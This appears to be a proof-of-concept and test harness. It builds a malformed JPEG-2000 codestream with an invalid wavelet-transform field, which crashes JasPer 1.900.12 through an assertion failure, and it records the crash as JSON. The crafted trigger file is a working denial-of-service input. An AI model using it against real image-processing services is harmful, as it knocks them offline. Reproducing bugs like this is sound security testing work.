#!/usr/bin/env python3
"""PoC: trigger an anomalous runtime behavior in the JasPer image transcoder.

The script dynamically constructs (in memory, at runtime) a JPEG-2000
codestream whose COD marker segment carries an invalid wavelet-transform
identifier (qmfbid == 2).  JasPer 1.900.12 feeds that value straight into
JPC_NOMINALGAIN() in src/libjasper/jpc/jpc_t1cod.c, which asserts
`qmfbid == JPC_COX_RFT' -- the assert fires and the process dies with
SIGABRT.  Builds that validate the field reject the file cleanly instead.

Usage:
    python3 poc.py --binary <path-to-binary> [--json-out <path>] [--timeout <sec>]
"""

import argparse
import json
import os
import re
import shutil
import signal
import struct
import subprocess
import sys
import tempfile
import time

# ---------------------------------------------------------------- payload ---

def _marker(marker_type, body):
    """One JPEG-2000 marker segment: FF <type> <Lsiz> <body>."""
    return bytes([0xFF, marker_type]) + struct.pack(">H", len(body) + 2) + body


def _siz_segment():
    """SIZ: 1x1 image, single component, 1 tile, 8-bit unsigned samples."""
    body = struct.pack(">HIIIIIIIIH",
                       0,          # Rsiz (capabilities)
                       1, 1,       # Xsiz, Ysiz
                       0, 0,       # XOsiz, YOsiz
                       1, 1,       # XTsiz, YTsiz
                       0, 0,       # XTOsiz, YTOsiz
                       1)          # Csiz
    body += bytes([7, 1, 1])       # Ssiz=8-bit unsigned, XRsiz, YRsiz
    return _marker(0x51, body)


def _cod_segment(transform=2):
    """COD: minimal coding style.  `transform` is the qmfbid field.

    0 = 5/3 reversible, 1 = 9/7 irreversible, anything >= 2 is invalid.
    The invalid value is the trigger.
    """
    body = (bytes([0, 0])                  # Scod, SGcod progression order
            + struct.pack(">H", 1)         # SGcod number of layers
            + bytes([0,                    # SPcod: no SOP/EPH
                     5,                    # SPcod: number of resolution levels
                     4, 4,                 # SPcod: code-block width/height exp
                     0])                   # SPcod: code-block style
            + bytes([transform]))          # SPcod: transform (qmfbid)  <-- bad
    return _marker(0x52, body)


def _qcd_segment():
    """QCD: quantization style 0 (no quantization), 3*5-2 = 13 subbands."""
    return _marker(0x5C, bytes([(2 << 5) | 0x00]) +
                   bytes([0x48, 0x48, 0x50] * 5))


def _sot_segment():
    """SOT: tile 0, one tile-part spanning to the end of the codestream."""
    return _marker(0x90, struct.pack(">HI", 0, 42) + bytes([0, 1]))


def _qcc_segment():
    """QCC: per-component quantization matching the QCD subband count."""
    return _marker(0x5D, bytes([0, (2 << 5) | 0x00]) + bytes(18))


def build_trigger_payload():
    """Assemble the complete JPEG-2000 codestream that trips the assert."""
    return b"".join([
        b"\xFF\x4F",          # SOC  start of codestream
        _siz_segment(),
        _cod_segment(transform=2),
        _qcd_segment(),
        _sot_segment(),
        _qcc_segment(),
        b"\xFF\x93",          # SOD  start of data
        b"\x80" * 6,          # minimal packet data
        b"\xFF\xD9",          # EOC  end of codestream
    ])


# ------------------------------------------------------------- execution ---

TRUNCATE_LIMIT = 8 * 1024  # 8 KB

# Output formats tried, in a fixed order, if an earlier attempt shows no
# anomaly.  The first (native jpc) always works on the reference build; the
# extras only guard against a build with that encoder compiled out.
OUTPUT_FORMATS = ("jpc", "jp2", "pnm")

SANITIZER_RE = re.compile(
    r"AddressSanitizer|LeakSanitizer|MemorySanitizer|ThreadSanitizer|"
    r"UndefinedBehaviorSanitizer|libFuzzer|runtime error:|SUMMARY: \w*Sanitizer")

ASSERT_LINE_RE = re.compile(
    r"Assertion\s+[`'\"](?P<expr>[^`'\"]+)[`'\"]\s+failed")

SOURCE_LOC_RE = re.compile(r"(?P<loc>\b[A-Za-z0-9_.-]+\.(?:c|h|cc|cpp|cxx):\d+)")


def signal_name(rc):
    """Map a negative subprocess returncode to a signal name, if possible."""
    if rc is None or rc >= 0:
        return None
    try:
        return signal.Signals(-rc).name
    except ValueError:
        return "SIG%d" % -rc


def truncate(text):
    return text[:TRUNCATE_LIMIT]


def normalize_crash_evidence(stderr, sig):
    """Pull the decisive evidence out of a crash and strip build-specific bits.

    glibc prints e.g.
        jasper: /src/jasper/src/libjasper/jpc/jpc_t1cod.c:144: \
JPC_NOMINALGAIN: Assertion `qmfbid == JPC_COX_RFT' failed.
    The absolute source path varies between builds, so keep only the file
    name onward.
    """
    lines = [ln.strip() for ln in (stderr or "").splitlines() if ln.strip()]
    keep = []
    for ln in lines:
        if ASSERT_LINE_RE.search(ln) or SANITIZER_RE.search(ln):
            keep.append(ln)
    if not keep:
        keep = lines[-4:] if lines else []
    cleaned = []
    for ln in keep:
        m = SOURCE_LOC_RE.search(ln)
        if m:
            ln = ln[m.start("loc"):]
        cleaned.append(ln)
    text = " | ".join(cleaned)
    if sig:
        text = "%s: %s" % (sig, text) if text else sig
    return text


def looks_anomalous(rc, timed_out, stdout, stderr):
    """True if the run shows a crash, sanitizer report, or hang."""
    if timed_out or (rc is not None and rc < 0):
        return True
    combined = (stderr or "") + (stdout or "")
    return bool(SANITIZER_RE.search(combined) or ASSERT_LINE_RE.search(combined))


def run_once(binary, in_path, out_path, fmt, deadline):
    """Run one transcode attempt under the remaining time budget."""
    cmd = [binary, "--input", in_path, "--output", out_path,
           "--output-format", fmt]
    remaining = deadline - time.monotonic()
    if remaining <= 0.5:
        return None, cmd, None, None, True  # no budget left -> skip

    timed_out = False
    stdout = stderr = ""
    rc = None
    start = time.monotonic()
    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE,
                            stderr=subprocess.PIPE)
    try:
        out, err = proc.communicate(timeout=max(remaining, 0.5))
        rc = proc.returncode
        stdout = out.decode("utf-8", "replace")
        stderr = err.decode("utf-8", "replace")
    except subprocess.TimeoutExpired:
        timed_out = True
        proc.kill()
        try:
            out, err = proc.communicate(timeout=5)
        except Exception:
            out, err = b"", b""
        rc = proc.returncode if proc.returncode is not None else -signal.SIGKILL
        stdout = out.decode("utf-8", "replace")
        stderr = err.decode("utf-8", "replace")
    runtime_ms = int((time.monotonic() - start) * 1000)
    return {
        "rc": rc,
        "stdout": stdout,
        "stderr": stderr,
        "timed_out": timed_out,
        "runtime_ms": runtime_ms,
    }, cmd, None, None, False


def main():
    parser = argparse.ArgumentParser(
        description="Trigger an anomalous runtime behavior in the JasPer "
                    "image transcoder via a crafted JPEG-2000 codestream.")
    parser.add_argument("--binary", required=True,
                        help="path to the jasper binary under test")
    parser.add_argument("--json-out", default=None,
                        help="write the result JSON to this path")
    parser.add_argument("--timeout", type=float, default=15.0,
                        help="overall timeout in seconds (default: 15)")
    args = parser.parse_args()

    binary = args.binary
    result = {
        "binary": binary,
        "command": [],
        "returncode": None,
        "signal": None,
        "timed_out": False,
        "runtime_ms": 0,
        "stdout": "",
        "stderr": "",
        "observable": {"kind": None, "value": "", "path": None},
        "error": None,
    }

    start = time.monotonic()
    deadline = start + args.timeout
    workdir = None

    try:
        if not os.path.isfile(binary):
            raise FileNotFoundError("binary not found: %s" % binary)
        if not os.access(binary, os.X_OK):
            raise PermissionError("binary is not executable: %s" % binary)

        payload = build_trigger_payload()
        workdir = tempfile.mkdtemp(prefix="jasper-poc-")
        in_path = os.path.join(workdir, "trigger.jpc")

        with open(in_path, "wb") as fh:
            fh.write(payload)

        attempts = []
        for fmt in OUTPUT_FORMATS:
            out_path = os.path.join(workdir, "out_%s.bin" % fmt)
            run, cmd, _, _, skipped = run_once(binary, in_path, out_path,
                                               fmt, deadline)
            if skipped:
                break
            attempts.append((cmd, run))
            if looks_anomalous(run["rc"], run["timed_out"],
                               run["stdout"], run["stderr"]):
                break

        if not attempts:
            raise RuntimeError("no execution attempt could be started "
                               "within the timeout budget")

        # Prefer the first anomalous attempt; otherwise report the primary
        # (jpc) attempt, which is the canonical trigger invocation.
        decisive = next(((c, r) for c, r in attempts
                         if looks_anomalous(r["rc"], r["timed_out"],
                                            r["stdout"], r["stderr"])),
                        attempts[0])
        cmd, run = decisive

        result["command"] = cmd
        result["returncode"] = run["rc"]
        result["signal"] = signal_name(run["rc"])
        result["timed_out"] = run["timed_out"]
        result["runtime_ms"] = run["runtime_ms"]
        result["stdout"] = truncate(run["stdout"])
        result["stderr"] = truncate(run["stderr"])

        # Observable evidence -------------------------------------------------
        combined = run["stdout"] + "\n" + run["stderr"]
        if run["timed_out"]:
            result["observable"] = {
                "kind": "custom",
                "value": "process timed out after %.1fs (possible hang)"
                         % args.timeout,
                "path": None,
            }
        elif run["rc"] is not None and run["rc"] < 0:
            result["observable"] = {
                "kind": "crash_trace",
                "value": normalize_crash_evidence(run["stderr"],
                                                  result["signal"]),
                "path": None,
            }
        elif SANITIZER_RE.search(combined):
            result["observable"] = {
                "kind": "crash_trace",
                "value": normalize_crash_evidence(run["stderr"], None),
                "path": None,
            }
        else:
            result["observable"] = {
                "kind": "stderr",
                "value": truncate(run["stderr"].strip()),
                "path": None,
            }

    except (FileNotFoundError, PermissionError) as exc:
        result["error"] = str(exc)
    except Exception as exc:  # pragma: no cover - defensive
        result["error"] = "%s: %s" % (type(exc).__name__, exc)
    finally:
        if workdir:
            shutil.rmtree(workdir, ignore_errors=True)

    if result["error"] and not result["observable"]["kind"]:
        result["observable"] = {
            "kind": "custom",
            "value": result["error"],
            "path": None,
        }

    result["runtime_ms"] = int((time.monotonic() - start) * 1000)

    text = json.dumps(result, indent=2)
    if args.json_out:
        with open(args.json_out, "w", encoding="utf-8") as fh:
            fh.write(text + "\n")
    print(text)

    # Exit 0 if an anomaly was observed (the PoC worked), 1 otherwise, 2 on
    # harness errors.  The JSON payload always carries the full story.
    if result["error"]:
        return 2
    obs = result["observable"]
    anomalous = (result["returncode"] is not None and result["returncode"] < 0) \
        or result["timed_out"] \
        or bool(obs["kind"] == "crash_trace" and obs["value"])
    return 0 if anomalous else 1


if __name__ == "__main__":
    sys.exit(main())
